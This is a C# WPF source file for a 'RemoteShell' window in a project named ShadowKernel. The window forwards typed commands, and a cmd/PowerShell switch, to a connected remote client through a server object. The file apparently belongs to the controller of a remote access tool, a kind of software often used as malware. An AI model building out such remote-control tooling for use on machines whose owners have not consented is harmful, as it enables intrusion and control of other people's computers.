using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using static ShadowKernel.Classes.Server;

namespace ShadowKernel.userControls
{
    /// <summary>
    /// Логика взаимодействия для RemoteShell.xaml
    /// </summary>
    public partial class RemoteShell : Window
    {
        private bool Powershell;
        private bool Restart;
        public int ConnectionID { get; set; }
        public bool Update { get; set; }
        public RemoteShell()
        {

            InitializeComponent();
            Update = true;

        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            Update = false;
            MainServer.Send(ConnectionID, Encoding.UTF8.GetBytes("StopRS"));
        }

        private void conRow_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Return)
            {
                try
                {
                    switch (conRow.Text)
                    {
                        case "cls":
                            console.Text = "";
                            break;
                        case "exit":
                            MainServer.Send(ConnectionID, Encoding.UTF8.GetBytes("StopRS"));
                            Close();
                            break;
                        default:
                            MainServer.Send(ConnectionID, Encoding.UTF8.GetBytes("[<COMMAND>]" + conRow.Text));
                            break;
                    }
                }
                catch { }
                conRow.Text = "";
            }
        }

        private void MenuItem_Click(object sender, RoutedEventArgs e)
        {
            if (!Powershell)
            {
                MainServer.Send(ConnectionID, Encoding.UTF8.GetBytes("[<COMMAND>]powershell"));
                Powershell = true;
                mItem.Header = "CMD";
            }
            else
            {
                MainServer.Send(ConnectionID, Encoding.UTF8.GetBytes("[<COMMAND>]cmd"));
                Powershell = false;
                mItem.Header = "Powershell";
            }
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            conRow.Focus();
        }
    }
}
